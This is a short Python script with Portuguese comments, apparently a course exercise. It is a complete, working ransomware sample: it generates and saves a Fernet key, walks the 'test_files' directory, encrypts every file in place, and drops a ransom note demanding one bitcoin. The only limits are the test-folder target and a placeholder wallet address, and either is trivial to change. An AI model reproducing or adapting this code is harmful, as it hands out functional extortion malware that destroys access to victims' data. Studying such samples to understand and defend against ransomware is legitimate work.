from cryptography.fernet import Fernet
import os

#1. Chave de criptografia

def gerar_chave():
    chave = Fernet.generate_key() 
    with open("chave.key","wb") as chave_file:
        chave_file.write(chave)


#2. Carregar a chave

def carregar_chave():
    return open("chave.key","rb").read()

#3. Criptografar um unico arquivo

def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file: 
        dados = file.read()
    dados_encriptados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)

#4. Encontrar os arquivos para criptografar

def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz,nome)
            if nome != "DIO.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista

#5. Mensagem de resgate

def criar_mensagem():
    with open("Leia isso.txt", "w") as f:
        f.write("Seus arquivos foram criptografados\n")
        f.write("Envia 1 bitcoin para o endereço X e envie o comprovante\n")

#6. Execução do codigo

def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("test_files")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    criar_mensagem()
    print("Execucao terminada")

if __name__ == "__main__":
    main()